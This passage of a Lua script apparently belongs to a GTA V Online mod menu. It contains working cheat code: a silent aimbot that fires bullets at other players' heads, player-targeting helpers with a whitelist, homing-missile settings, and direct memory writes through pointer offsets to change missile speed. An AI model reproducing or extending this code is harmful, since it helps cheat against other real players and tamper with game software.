    ShootSingleBulletBetweenCoords(ourfront, bonecoords, dmg, weaponHash, ourped, true, false, speed)
end

function GetPlayerName_ped(ped)
    local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(ped)
    local playerName = NETWORK.NETWORK_PLAYER_GET_NAME(playerID)
    return playerName
end

function GetSuitableAimbotTarget(fov, fovcheck, dist, loscheck)
    local ourped = GetLocalPed()
    local distsq = dist * dist
    local ourc = ENTITY.GET_ENTITY_COORDS(ourped)
    local entTable = entities.get_all_peds_as_pointers()
    local inRange = {}
    for _, entity in pairs(entTable) do

        local entpos = entities.get_position(entity)

            if PVP_SYSTEM.VDIST2(ourc.x, ourc.y, ourc.z, entpos.x, entpos.y, entpos.z) <= distsq then --distance check

                local handle = entities.pointer_to_handle(entity)
                if (handle ~= ourped) then
                    if (not PED.IS_PED_DEAD_OR_DYING(handle)) and (INTERIOR.GET_INTERIOR_FROM_ENTITY(handle) == 0) then --dead/interior check

                        if (fovcheck and PED.IS_PED_FACING_PED(ourped, handle, fov)) or (not fovcheck) then --fov check

                            if (PED.IS_PED_A_PLAYER(handle)) and (not AIM_WHITELIST[NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)]) then --whitelist, player check

                                if (loscheck and ENTITY.HAS_ENTITY_CLEAR_LOS_TO_ENTITY(ourped, handle, 17)) or (not loscheck) then --line-of-sight check
                                    inRange[#inRange+1] = handle
                                end
                            end
                        end
                    end
                end
            end

    end
    local retplayer
    local d = 99999999999
    if #inRange ~= 0 then
        for _, ped in pairs(inRange) do
            local tc = ENTITY.GET_ENTITY_COORDS(ped)
            local vidsti = PVP_SYSTEM.VDIST2(ourc.x, ourc.y, ourc.z, tc.x, tc.y, tc.z)
            if vidsti < d then
                retplayer = ped
                d = vidsti
            end
        end
        return retplayer
    end
    return nil
end

function DoesTableContainValue(table, value)
    for _, v in pairs(table) do
        if v == value then return true end
    end
    return false
end

function GetClosestPlayerWithRange_Whitelist_DisallowEntities(range, disallowedEntities, inair) --variation of GetClosestPlayerWithRange_Whitelist, that makes entities not returned if they are in the table.
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local tbl = {}
    local closest_player = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = PVP_SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            local handle = entities.pointer_to_handle(pedPointers[i])
            local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
            if (inair and (ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(handle) >= 9)) or (not inair) then --air check
                if not AIM_WHITELIST[playerID] then --this is the whitelist check.
                    if not DoesTableContainValue(disallowedEntities, handle) then --this is the disallowed entities table check
                        tbl[#tbl+1] = handle
                    end
                end
            end
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= GetLocalPed() then
                if PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = ENTITY.GET_ENTITY_COORDS(tbl[i])
                    local e = PVP_SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_player = tbl[i]
                    end
                end
            end
        end
    end
    if closest_player ~= 0 then
        return closest_player
    else
        return nil
    end
end

function GetValueIndexFromTable(table, value)
    for i, v in pairs(table) do
        if v == value then return i end
    end
    return nil
end

function GetClosestPlayerWithRange_Whitelist(range, inair) --variation of getClosestPlayerWithinRange to work with my whitelisting feature for silent aimbot
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local tbl = {}
    local closest_player = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = PVP_SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            local handle = entities.pointer_to_handle(pedPointers[i])
            if (inair and (ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(handle) >= 9)) or (not inair) then --air check
                local playerID = NETWORK.NETWORK_GET_PLAYER_INDEX_FROM_PED(handle)
                if not AIM_WHITELIST[playerID] then --this is the whitelist check.
                    tbl[#tbl+1] = handle
                end
            end
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= GetLocalPed() then
                if PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = ENTITY.GET_ENTITY_COORDS(tbl[i])
                    local e = PVP_SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_player = tbl[i]
                    end
                end
            end
        end
    end
    if closest_player ~= 0 then
        return closest_player
    else
        return nil
    end
end

function GetClosestNonPlayerPedWithRange_DisallowedEntities(range, disallowedEntities, inair) --modified version of GetClosestNonPlayerPedWithRange that takes a table of disallowed entities (blacklisted peds)
    local pedPointers = entities.get_all_peds_as_pointers()
    local rangesq = range * range
    local ourCoords = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
    local tbl = {}
    local closest_ped = 0
    for i = 1, #pedPointers do
        local tarcoords = entities.get_position(pedPointers[i])
        local vdist = PVP_SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
        if vdist <= rangesq then
            local handle = entities.pointer_to_handle(pedPointers[i])
            if (inair and (ENTITY.GET_ENTITY_HEIGHT_ABOVE_GROUND(handle) >= 9)) or (not inair) then
                if not DoesTableContainValue(disallowedEntities, handle) then
                    tbl[#tbl+1] = handle
                end
            end
        end
    end
    if tbl ~= nil then
        local dist = 999999
        for i = 1, #tbl do
            if tbl[i] ~= GetLocalPed() then
                if not PED.IS_PED_A_PLAYER(tbl[i]) then
                    local tarcoords = getEntityCoords(tbl[i])
                    local e = PVP_SYSTEM.VDIST2(ourCoords.x, ourCoords.y, ourCoords.z, tarcoords.x, tarcoords.y, tarcoords.z)
                    if e < dist then
                        dist = e
                        closest_ped = tbl[i]
                    end
                end
            end
        end
    end
    if closest_ped ~= 0 then
        return closest_ped
    else
        return nil
    end
end

function SetVehicleMissileSpeed(value)
    local offsets = {0x10D8, 0x70, 0x60, 0x58}
    local addr = entities.handle_to_pointer(PLAYER.PLAYER_PED_ID())
    for i = 1, (#offsets - 1) do
        -- make sure not to read from/write to a null pointer
        if addr == 0 then
            -- got a null pointer at some point
            return -1.0
        end
        addr = memory.read_long(addr + offsets[i])
    end
    addr = addr + offsets[#offsets]
    
    if addr == 0 then
        return -1.0
    else
        memory.write_float(addr, value)
        --memory.read_float(addr)
    end
end


function start_silent_aimbot()
    saimbot_thread = util.create_thread(function (thr)
    while true do
        if not silent_aimbot then
            util.stop_thread()
        end
        local target = get_aimbot_target()
        if target ~= 0 then
            local t_pos = PED.GET_PED_BONE_COORDS(target, 31086, 0.01, 0, 0)
            local t_pos2 = PED.GET_PED_BONE_COORDS(target, 31086, -0.01, 0, 0.00)
            -- debug shit, ignore
            if false then
                GRAPHICS.DRAW_MARKER(0, t_pos['x'], t_pos['y'], t_pos['z'], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
                GRAPHICS.DRAW_MARKER(0, t_pos2['x'], t_pos2['y'], t_pos2['z'], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.1, 0.1, 0.1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
            end
            GRAPHICS.DRAW_MARKER(0, t_pos['x'], t_pos['y'], t_pos['z']+2, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, 1, 1, 255, 0, 255, 100, false, true, 2, false, 0, 0, false)
            if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) then
                local wep = WEAPON.GET_SELECTED_PED_WEAPON(PLAYER.PLAYER_PED_ID())
                local dmg = WEAPON.GET_WEAPON_DAMAGE(wep, 0)
                if satarget_damageo then
                    dmg = sa_odmg
                end
                local veh = PED.GET_VEHICLE_PED_IS_IN(target, false)
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY(t_pos['x'], t_pos['y'], t_pos['z'], t_pos2['x'], t_pos2['y'], t_pos2['z'], dmg, true, wep, PLAYER.PLAYER_PED_ID(), true, false, 10000, veh)
            end
        end
        wait()
    end
end)
end

VEH_MISSILE_SPEED = 10000

MISL_AIM = false
missile_settings = {
    radius = 300,
    speed = 100,
    los = true,
    cam = false,
    ptfx = true,
    ptfx_scale = 1,
    air_target = false,
    multitarget = false,
    multiped = false
}
missile_particles = {
    name = "exp_grd_rpg_lod",
    dictionary = "core"
}

--Later: block rockets (spawn walls when detecting they are in range)

ATTACH_CAM_TO_ENTITY_WITH_FIXED_DIRECTION = function (--[[Cam (int)]] cam, --[[Entity (int)]] entity, --[[float]] xRot, --[[float]] yRot, --[[float]] zRot, --[[float]] xOffset, --[[float]] yOffset, --[[float]] zOffset, --[[BOOL (bool)]] isRelative)
    native_invoker.begin_call()
    native_invoker.push_arg_int(cam)
    native_invoker.push_arg_int(entity)
    native_invoker.push_arg_float(xRot); native_invoker.push_arg_float(yRot); native_invoker.push_arg_float(zRot)
    native_invoker.push_arg_float(xOffset); native_invoker.push_arg_float(yOffset); native_invoker.push_arg_float(zOffset)
    native_invoker.push_arg_bool(isRelative)
    native_invoker.end_call("202A5ED9CE01D6E7")
end

--https://github.com/Sainan/gta-v-joaat-hash-db/blob/senpai/out/objects-hex.csv

Rocket_Hashes = {
    {"rpg", util.joaat("w_lr_rpg_rocket")},
    {"homingrpg", util.joaat("w_lr_homing_rocket")},
    {"oppressor2", util.joaat("w_ex_vehiclemissile_3")},
    {"b11barrage", util.joaat("w_smug_airmissile_01b")},
    {"b11regular", util.joaat("w_battle_airmissile_01")},
    {"chernobog", util.joaat("w_ex_vehiclemissile_4")},
    {"akula", util.joaat("w_smug_airmissile_02")},
    {"grenadelauncher", util.joaat("w_lr_40mm")}, --grenade launcher lmfao
    {"compactemplauncher", util.joaat("w_lr_ml_40mm")}, --compact emp launhcer lmao
    {"teargas", util.joaat("w_ex_grenadesmoke")} --tear gas grenade lmfao
}

Chosen_Rocket_Hash = Rocket_Hashes[1][2] --default is the regular RPG
MISSILE_ENTITY_TABLE = {}

MISL_AIR = false

ORB_Sneaky = false

sa_fov = 180

sa_odmg = 100

CAR_S_sneaky = false
CAR_S_BLACKLIST = {}


LegitRapidFire = false
LegitRapidMS = 100
-----------------
--[[
 _________     _________    ________     ________     ________     _________     _________    ________     ________     ________      _________     _________    ________     ________     ________ 
|\   ____ \   |\___  ___\  |\   __  \   |\   __  \   |\   __  \   |\   ____ \   |\___  ___\  |\   __  \   |\   __  \   |\   __  \    |\   ____ \   |\___  ___\  |\   __  \   |\   __  \   |\   __  \
\ \  \___| \  \|___\  \_/  \ \  \|\ /_  \ \  \|\ /_  \ \  \|\ /_  \ \  \___| \  \|___\  \_/  \ \  \|\ /_  \ \  \|\ /_  \ \  \|\ /_   \ \  \___| \  \|___\  \_/  \ \  \|\ /_  \ \  \|\ /_  \ \  \|\ /_
 \ \  \ __  \     \ \  \    \ \   __  \  \ \   __  \  \ \   __  \  \ \  \ __  \     \ \  \    \ \   __  \  \ \   __  \  \ \   __  \   \ \  \ __  \     \ \  \    \ \   __  \  \ \   __  \  \ \   __  \ 
  \ \  \|\ \ \     \ \  \    \ \  \|\  \  \ \  \|\  \  \ \  \|\  \  \ \  \|\ \ \     \ \  \    \ \  \|\  \  \ \  \|\  \  \ \  \|\  \   \ \  \|\ \ \     \ \  \    \ \  \|\  \  \ \  \|\  \  \ \  \|\  \
   \ \________\     \ \__\    \ \_______\  \ \_______\  \ \_______\  \ \________\     \ \__\    \ \_______\  \ \_______\  \ \_______\   \ \________\     \ \__\    \ \_______\  \ \_______\  \ \_______\
    \|________|      \|__|     \|_______|   \|_______|   \|_______|   \|________|      \|__|     \|_______|   \|_______|   \|_______|    \|________|      \|__|     \|_______|   \|_______|   \|_______|
                                                                                                                                                                                                                                    
 _________  ________  ________  ________   ________  ___       ________  _________  _______   ________          ________ ________  ________  _____ ______              _________      _________ 
|\___   ___\\   __  \|\   __  \|\   ___  \|\   ____\|\  \     |\   __  \|\___   ___\\  ___ \ |\   ___ \        |\  _____\\   __  \|\   __  \|\   _ \  _   \           |\    _____\   |\___  ___\  
\|___ \  \_\ \  \|\  \ \  \|\  \ \  \\ \  \ \  \___|\ \  \    \ \  \|\  \|___ \  \_\ \   __/|\ \  \_|\ \       \ \  \__/\ \  \|\  \ \  \|\  \ \  \\\__\ \  \           \ \  \___| \  \|___\  \_/  
     \ \  \ \ \   _  _\ \   __  \ \  \\ \  \ \_____  \ \  \    \ \   __  \   \ \  \ \ \  \_|/_\ \  \ \\ \       \ \   __\\ \   _  _\ \  \\\  \ \  \\|__| \  \           \ \  \ __  \     \ \  \    
      \ \  \ \ \  \\  \\ \  \ \  \ \  \\ \  \|____|\  \ \  \____\ \  \ \  \   \ \  \ \ \  \_|\ \ \  \_\\ \       \ \  \_| \ \  \\  \\ \  \\\  \ \  \    \ \  \           \ \  \|\ \ \     \ \  \    
       \ \__\ \ \__\\ _\\ \__\ \__\ \__\\ \__\____\_\  \ \_______\ \__\ \__\   \ \__\ \ \_______\ \_______\       \ \__\   \ \__\\ _\\ \_______\ \__\    \ \__\           \ \________\     \ \__\    
        \|__|  \|__|\|__|\|__|\|__|\|__| \|__|\_________\|_______|\|__|\|__|    \|__|  \|_______|\|_______|        \|__|    \|__|\|__|\|_______|\|__|     \|__|            \|________|      \|__|  
--]]
